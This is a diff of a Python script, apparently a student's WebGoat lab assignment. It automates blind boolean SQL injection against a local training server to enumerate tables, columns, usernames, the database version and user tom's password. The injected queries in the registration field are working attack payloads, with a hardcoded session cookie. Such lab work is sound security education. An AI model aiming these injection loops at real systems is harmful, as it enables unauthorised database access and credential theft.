@@ -3,53 +3,58 @@ import string
 import itertools
 import requests
 import pickle
+import sys
 
-def get_version():
-    headers = {
-        'Cookie': "JSESSIONID=ZACQ_4IVTBoYHeYkkuGdmE5DM_1vJZ79H-4nQrt2",
-    }
+from helpers import version, test, usernames
 
-    digits = string.digits + '.'
-    version = ''
-    digit_index = 0
-    version_index = 0
 
-    while True:
-        query = f'tom\' and substring(database_version(), {version_index + 1}, 1)=\'{digits[digit_index]}'
-        print(query)
+# def get_version():
+#     headers = {
+#         'Cookie': "JSESSIONID=ZACQ_4IVTBoYHeYkkuGdmE5DM_1vJZ79H-4nQrt2",
+#     }
+#
+#     digits = string.digits + '.'
+#     version = ''
+#     digit_index = 0
+#     version_index = 0
+#
+#     while True:
+#         query = f'tom\' and substring(database_version(), {version_index + 1}, 1)=\'{digits[digit_index]}'
+#         print(query)
+#
+#         data = {
+#             'username_reg': query,
+#             'email_reg': 'paul@gmail.com',
+#             'password_reg': 'paul123',
+#             'confirm_password_reg': 'paul123'
+#         }
+#
+#         r = requests.put('http://172.17.0.2:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers,
+#                          data=data)
+#
+#         try:
+#             response = json.loads(r.text)
+#
+#         except:
+#             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
+#             return False
+#
+#         if "already exists please try to register with a different username" not in response['feedback']:
+#             digit_index += 1
+#             if digit_index > len(digits) - 1:
+#                 print('Final: ', version)
+#                 return
+#         else:
+#             version += digits[digit_index]
+#             print(version)
+#             digit_index = 0
+#             version_index += 1
 
-        data = {
-            'username_reg': query,
-            'email_reg': 'paul@gmail.com',
-            'password_reg': 'paul123',
-            'confirm_password_reg': 'paul123'
-        }
-
-        r = requests.put('http://172.17.0.2:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers,
-                         data=data)
-
-        try:
-            response = json.loads(r.text)
-
-        except:
-            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
-            return False
-
-        if "already exists please try to register with a different username" not in response['feedback']:
-            digit_index += 1
-            if digit_index > len(digits) - 1:
-                print('Final: ', version)
-                return
-        else:
-            version += digits[digit_index]
-            print(version)
-            digit_index = 0
-            version_index += 1
 
 def get_usernames():
     usernames = []
     keywords = ['USERID', 'USERNAME', 'USER_ID', 'USER_NAME', 'HANDLE']
-    tables_columns = pickle.load(open('columns.pkl', 'rb'))
+    tables_columns = pickle.load(open('outputs/columns.pkl', 'rb'))
     alphabets = string.ascii_letters + string.digits + '_!@#$%^&*-+'
     print(alphabets)
 
@@ -73,7 +78,7 @@ def get_usernames():
                                 queue.append(word)
 
                         program_state_usernames.append([queue, all_usernames])
-                        pickle.dump(program_state_usernames, open('program_state_usernames.pkl', 'wb'))
+                        pickle.dump(program_state_usernames, open('states/program_state_usernames.pkl', 'wb'))
 
                     for name in all_usernames:
                         if new_inject(table_name, column, name):
@@ -81,12 +86,13 @@ def get_usernames():
                             username_dict[(table_name, column)].append(name)
                     usernames.append(username_dict)
                     print(usernames)
-                    pickle.dump(usernames, open('usernames.pkl', 'wb'))
+                    pickle.dump(usernames, open('outputs/usernames.pkl', 'wb'))
+
 
 def get_column_names():
     tables = []
     columns = []
-    all_tables = pickle.load(open('tables.pkl', 'rb'))
+    all_tables = pickle.load(open('outputs/tables.pkl', 'rb'))
 
     for i in all_tables:
         if i.startswith('CHALLENGE'):
@@ -100,7 +106,6 @@ def get_column_names():
         queue = ['']
         program_state_columns = []
 
-
         while queue:
             queue_word = queue.pop(0)
             for a in alphabets:
@@ -111,7 +116,7 @@ def get_column_names():
                     queue.append(word)
 
             program_state_columns.append([queue, all_columns])
-            pickle.dump(program_state_columns, open('program_state_column.pkl', 'wb'))
+            pickle.dump(program_state_columns, open('states/program_state_column.pkl', 'wb'))
 
         for name in all_columns:
             if new_inject(table_name, name):
@@ -119,7 +124,8 @@ def get_column_names():
                 column_dict[table_name].append(name)
         columns.append(column_dict)
         print(columns)
-        pickle.dump(columns, open('columns.pkl', 'wb'))
+        pickle.dump(columns, open('outputs/columns.pkl', 'wb'))
+
 
 def get_table_names():
     tables = []
@@ -138,14 +144,14 @@ def get_table_names():
                 queue.append(word)
 
         program_state.append([queue, all_names])
-        pickle.dump(program_state, open('program_state.pkl', 'wb'))
+        pickle.dump(program_state, open('states/program_state.pkl', 'wb'))
 
     for name in all_names:
         if new_inject(name):
             print(f'Found Table: {name}')
             tables.append(name)
     print(tables)
-    pickle.dump(tables, open('tables.pkl', 'wb'))
+    pickle.dump(tables, open('outputs/tables.pkl', 'wb'))
 
 
 def new_inject(table_name, column_name="", user_id=""):
@@ -154,7 +160,7 @@ def new_inject(table_name, column_name="", user_id=""):
     }
 
     query = f'tom\' and exists (select {column_name} from {table_name} where ' \
-                      f'{column_name}=\'{user_id}\')--'
+            f'{column_name}=\'{user_id}\')--'
 
     # query = f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
     # f'and column_name= \'{column_name}\')--'
@@ -190,8 +196,8 @@ def inject(word, length, table_name="", column_name=""):
         'Cookie': "JSESSIONID=ZACQ_4IVTBoYHeYkkuGdmE5DM_1vJZ79H-4nQrt2",
     }
 
-    query =  f'tom\' and exists (select {column_name} from {table_name} where ' \
-                      f'substring({column_name},1, {length})=\'{word}\')--'
+    query = f'tom\' and exists (select {column_name} from {table_name} where ' \
+            f'substring({column_name},1, {length})=\'{word}\')--'
 
     # query = f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
     # f'and substring(column_name,1,{length})=\'{word}\')--'
@@ -263,8 +269,47 @@ def get_password():
             password_index += 1
 
 
+def menu():
+    print()
+    print(f'ASSIGNMENT 1')
+    print(f'hrpaul@iu.edu')
+    print()
+    print(f'Enter option number,')
+    print(f'1. Table Names')
+    print(f'2. Database Version')
+    print(f'3. Names of all columns contained in the table whose name starts with ‘CHALLENGE’')
+    print(f'4. All original usernames stored in the table whose name starts with ‘CHALLENGE’')
+    print(f'5. The password of user ‘tom’ stored in the table whose name starts with ‘CHALLENGE’.')
+    print(f'6. Exit')
+    print()
+
+
+def exit():
+    print(f'Thank you.')
+    sys.exit(0)
+
+
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
+    cookie = ''
+    test.test()
+
+    while 1:
+        menu()
+        try:
+            option = int(input())
+            if option not in range(1, 7):
+                raise ValueError
+            if option == 2:
+                print(f'Version: {version.get_version(cookie)}')
+            if option == 4:
+                usernames.get_usernames(cookie)
+            if option == 6:
+                exit()
+
+        except ValueError:
+            print("Please enter values from 1-6 only.")
+
     # print(new_inject('CHALLENGE_USERS', 'EMAIL'))
     # print(new_inject('CHALLENGE_USERS', 'USERID', 'tom'))
     # test()
@@ -272,6 +317,6 @@ if __name__ == '__main__':
     # ['EMAIL', 'USERID', 'PASSWORD']
     # get_usernames()
     # get_column_names()
-    get_password()
+    # get_password()
     # get_table_names()
     # get_version()
